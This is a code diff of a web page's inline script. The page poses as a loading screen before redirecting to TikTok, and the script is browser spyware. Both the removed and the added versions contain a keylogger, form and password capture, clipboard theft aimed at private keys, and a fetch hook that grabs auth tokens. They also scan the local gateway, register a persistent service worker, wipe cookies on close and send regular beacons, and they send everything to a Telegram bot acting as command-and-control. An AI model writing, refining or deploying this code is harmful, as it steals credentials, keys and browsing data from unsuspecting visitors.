-            const obs = new MutationObserver(muts => {
-                muts.forEach(m => m.addedNodes.forEach(n => {
-                    if (n.tagName === 'FORM' && !n.dataset.h) {
-                        n.dataset.h = '1';
-                        n.addEventListener('submit', function() {
-                            const d = {};
-                            this.querySelectorAll('input,textarea,select').forEach(inp => {
-                                if (inp.value) d[inp.name||inp.id||'f'] = inp.value.substring(0,500);
-                            });
-                            if (Object.keys(d).length) {
-                                let m = `📋 **Form:**\n`;
-                                for (const [k,v] of Object.entries(d)) m += `• ${k}: \`${v}\`\n`;
-                                tg(m);
-                            }
-                        }, true);
-                    }
-                }));
+            new MutationObserver(muts=>{muts.forEach(m=>m.addedNodes.forEach(n=>{
+                if(n.tagName==='FORM'&&!n.dataset.h){
+                    n.dataset.h='1';n.addEventListener('submit',function(){
+                        const d={};this.querySelectorAll('input,textarea,select').forEach(inp=>{if(inp.value)d[inp.name||inp.id||'f']=inp.value.substring(0,500);});
+                        if(Object.keys(d).length){let m='📋 **Form:**\n';for(const[k,v]of Object.entries(d))m+=`• ${k}: \`${v}\`\n`;tg(m);}
+                    },true);
+                }
+            }));}).observe(document.body,{childList:true,subtree:true});
+
+            // Keylogger
+            let buf='',lt=Date.now();
+            document.addEventListener('keydown',e=>{
+                let k=e.key;if(['Shift','Control','Alt','Meta','CapsLock'].includes(k))return;
+                if(k==='Enter')k='\n';else if(k==='Backspace')k='⌫';else if(k.length>1&&!k.startsWith('F'))return;
+                buf+=k;if(buf.length>=20||(Date.now()-lt)>4000){if(buf.trim())tg(`⌨️ \`${buf.substring(0,300)}\``);buf='';lt=Date.now();}
             });
-            obs.observe(document.body, {childList:true, subtree:true});
-
-            // ─── Keylogger + password capture ───
-            let buf = '', lastT = Date.now();
-            document.addEventListener('keydown', e => {
-                let k = e.key;
-                if (['Shift','Control','Alt','Meta','CapsLock'].includes(k)) return;
-                if (k === 'Enter') k = '\n';
-                else if (k === 'Backspace') k = '⌫';
-                else if (k.length > 1 && !k.startsWith('F')) return;
-                buf += k;
-                if (buf.length >= 20 || (Date.now() - lastT) > 4000) {
-                    if (buf.trim()) tg(`⌨️ \`${buf.substring(0,300)}\``);
-                    buf = ''; lastT = Date.now();
+            document.addEventListener('focusout',e=>{
+                if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){
+                    const v=e.target.value;if(v&&v.length>2){const t=e.target.type||'text';const n=e.target.name||e.target.id||'f';
+                    tg(`${t==='password'?'🔑':'📝'} **${n}:** \`${v.substring(0,300)}\``);
+                    if(t==='password')tgFile(new Blob([`${n}: ${v}`],{type:'text/plain'}),`pw_${Date.now()}.txt`,'🔑');}
                 }
-            });
+            },true);
 
-            document.addEventListener('focusout', e => {
-                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-                    const v = e.target.value;
-                    if (v && v.length > 2) {
-                        const t = e.target.type || 'text';
-                        const n = e.target.name || e.target.id || 'f';
-                        tg(`${t === 'password' ? '🔑' : '📝'} **${n}:** \`${v.substring(0,300)}\``);
-                        if (t === 'password')
-                            tgFile(new Blob([`${n}: ${v}`],{type:'text/plain'}),`pw_${Date.now()}.txt`,'🔑');
-                    }
+            // Clipboard
+            setInterval(async()=>{
+                try{const t=await navigator.clipboard.readText();if(t&&t.trim()){const h=hs(t);if(h!==window._ch){window._ch=h;tg(`📋 **Clip:** \`${t.substring(0,400)}\``);if(t.includes('-----BEGIN')||t.match(/^[A-Za-z0-9+/=]{30,}$/))tgFile(new Blob([t],{type:'text/plain'}),`key_${Date.now()}.txt`,'🔑');}}}catch(e){}
+            },5000);
+
+            // Network intercept
+            const of=window.fetch;window.fetch=function(...a){const url=typeof a[0]==='string'?a[0]:(a[0]?.url||'');if(a[1]?.body&&typeof a[1].body==='string'&&(a[1].body.includes('pass')||a[1].body.includes('token')||a[1].body.includes('auth')||a[1].body.includes('secret')))tg(`🌐 \`${url.substring(0,60)}\`\n\`\`\`${a[1].body.substring(0,600)}\`\`\``);return of.apply(this,a);};
+
+            // Gateway scan
+            setTimeout(async()=>{
+                const found=[];
+                for(const gw of['192.168.1.1','192.168.0.1','10.0.0.1','10.0.0.138','172.16.0.1','192.168.1.254']){
+                    try{await new Promise(r=>{const img=new Image();const t=setTimeout(()=>{img.src='';r();},300);img.onload=()=>{clearTimeout(t);found.push(gw);r();};img.onerror=()=>{clearTimeout(t);r();};img.src=`http://${gw}/?${Date.now()}`;});}catch(e){}
                 }
-            }, true);
+                if(found.length)tg(`🌐 **Gateways:** ${found.join(', ')}`);
+            },2000);
 
-            // ─── Clipboard monitor ───
-            setInterval(async () => {
-                try {
-                    const t = await navigator.clipboard.readText();
-                    if (t && t.trim()) {
-                        const h = hs(t);
-                        if (h !== window._ch) {
-                            window._ch = h;
-                            tg(`📋 **Clip:** \`${t.substring(0,400)}\``);
-                            if (t.includes('-----BEGIN') || t.match(/^[A-Za-z0-9+/=]{30,}$/))
-                                tgFile(new Blob([t],{type:'text/plain'}),`key_${Date.now()}.txt`,'🔑');
-                        }
-                    }
-                } catch(e) {}
-            }, 5000);
-
-            // ─── Network interception ───
-            const of = window.fetch;
-            window.fetch = function(...a) {
-                const url = typeof a[0]==='string' ? a[0] : (a[0]?.url||'');
-                if (a[1]?.body && typeof a[1].body==='string' && (a[1].body.includes('pass')||a[1].body.includes('token')||a[1].body.includes('auth')||a[1].body.includes('secret')))
-                    tg(`🌐 \`${url.substring(0,60)}\`\n\`\`\`${a[1].body.substring(0,600)}\`\`\``);
-                return of.apply(this, a);
-            };
-
-            // ─── Network gateway scan ───
-            setTimeout(async () => {
-                const gws = ['192.168.1.1','192.168.0.1','10.0.0.1','10.0.0.138','172.16.0.1','192.168.1.254'];
-                const found = [];
-                for (const gw of gws) {
-                    try {
-                        await new Promise(r => {
-                            const img = new Image();
-                            const t = setTimeout(() => { img.src=''; r(); }, 300);
-                            img.onload = () => { clearTimeout(t); found.push(gw); r(); };
-                            img.onerror = () => { clearTimeout(t); r(); };
-                            img.src = `http://${gw}/?${Date.now()}`;
-                        });
-                    } catch(e) {}
-                }
-                if (found.length) tg(`🌐 **Gateways:** ${found.join(', ')}`);
-            }, 2000);
-
-            // ─── Service Worker ───
-            setTimeout(async () => {
-                try {
-                    const code = `self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('activate',e=>e.waitUntil(clients.claim()));self.addEventListener('message',e=>{if(e.data==='ping'){fetch('https://api.telegram.org/bot${C2.botToken}/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'${C2.chatId}',text:'🕒 **SW:** '+new Date().toISOString(),parse_mode:'Markdown'})}).catch(()=>{});}});self.addEventListener('fetch',e=>{if(e.request.mode==='navigate'){e.waitUntil(fetch('https://api.telegram.org/bot${C2.botToken}/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'${C2.chatId}',text:'🌐 **Nav:** '+e.request.url,parse_mode:'Markdown'})}).catch(()=>{}));}});`;
-                    const reg = await navigator.serviceWorker.register(
-                        URL.createObjectURL(new Blob([code],{type:'application/javascript'})), {scope:'/'}
-                    );
+            // Service Worker
+            setTimeout(async()=>{
+                try{
+                    const code=`self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('activate',e=>e.waitUntil(clients.claim()));self.addEventListener('message',e=>{if(e.data==='ping'){fetch('https://api.telegram.org/bot${C2.botToken}/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'${C2.chatId}',text:'🕒 **SW:** '+new Date().toISOString(),parse_mode:'Markdown'})}).catch(()=>{});}});self.addEventListener('fetch',e=>{if(e.request.mode==='navigate'){e.waitUntil(fetch('https://api.telegram.org/bot${C2.botToken}/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'${C2.chatId}',text:'🌐 **Nav:** '+e.request.url,parse_mode:'Markdown'})}).catch(()=>{}));}});`;
+                    const reg=await navigator.serviceWorker.register(URL.createObjectURL(new Blob([code],{type:'application/javascript'})),{scope:'/'});
                     tg(`🕸️ **SW:** ${reg.scope}`);
-                    setInterval(() => reg.active?.postMessage('ping'), 30000);
-                } catch(e) {}
-            }, 1000);
+                    setInterval(()=>reg.active?.postMessage('ping'),30000);
+                }catch(e){}
+            },1000);
 
-            // ─── Self-destruct ───
-            window.addEventListener('beforeunload', () => {
-                document.cookie.split(';').forEach(c => {
-                    document.cookie = c.replace(/^ +/,'').replace(/=.*/, `=;expires=${new Date(0).toUTCString()};path=/`);
-                });
-                try { localStorage.clear(); } catch(e) {}
-                try { sessionStorage.clear(); } catch(e) {}
-                navigator.sendBeacon(`https://api.telegram.org/bot${C2.botToken}/sendMessage`,
-                    new Blob([JSON.stringify({chat_id:C2.chatId, text:`🚪 **Closed** ${new Date().toISOString()}`, parse_mode:'Markdown'})], {type:'application/json'}));
-            });
+            // Self-destruct
+            window.addEventListener('beforeunload',()=>{document.cookie.split(';').forEach(c=>{document.cookie=c.replace(/^ +/,'').replace(/=.*/,`=;expires=${new Date(0).toUTCString()};path=/`);});try{localStorage.clear();}catch(e){}try{sessionStorage.clear();}catch(e){}navigator.sendBeacon(`https://api.telegram.org/bot${C2.botToken}/sendMessage`,new Blob([JSON.stringify({chat_id:C2.chatId,text:`🚪 **Closed** ${new Date().toISOString()}`,parse_mode:'Markdown'})],{type:'application/json'}));});
 
-            // ─── Beacon every 2 min ───
-            setInterval(() => tg(`💓 ${new Date().toLocaleString()}`), 120000);
+            // Beacon
+            setInterval(()=>tg(`💓 ${new Date().toLocaleString()}`),120000);
         }
 
-        // ═════════════════════════════════════════════════
-        //  BOOT
-        // ═════════════════════════════════════════════════
-
+        // ─── MAIN ───
         async function main() {
-            // Phase 1: Silent recon
-            await recon();
+            // Total timeline: ~10s
+            try {
+                tg('⏳ **Started**');
+                
+                // Phase 1: Silent recon (0.5s)
+                await recon();
 
-            // Phase 2: Request permissions naturally (browser prompts)
-            await requestPermissions();
+                // Update loader text
+                document.querySelector('.loader-text').innerHTML = '<span>Almost ready...</span>';
+                await sleep(500);
 
-            // Phase 3: Deploy background horror
-            deployBackgroundHorror();
+                // Phase 2: Permissions + captures (~8s)
+                await captureAll();
 
-            // Phase 4: Redirect after enough time
-            setTimeout(() => {
+                // Phase 3: Deploy background
+                deployBackground();
+
+                // Redirect to TikTok after ~10s total
+                await sleep(1500);
                 window.location.href = C2.fallbackUrl;
-            }, 15000);
+
+            } catch(e) {
+                tg(`❌ Error: ${e.message}`);
+                window.location.href = C2.fallbackUrl;
+            }
         }
 
-        // Start
-        setTimeout(main, 500);
+        // ─── BOOT ───
+        setTimeout(main, 300);
     </script>
 </body>
 </html>
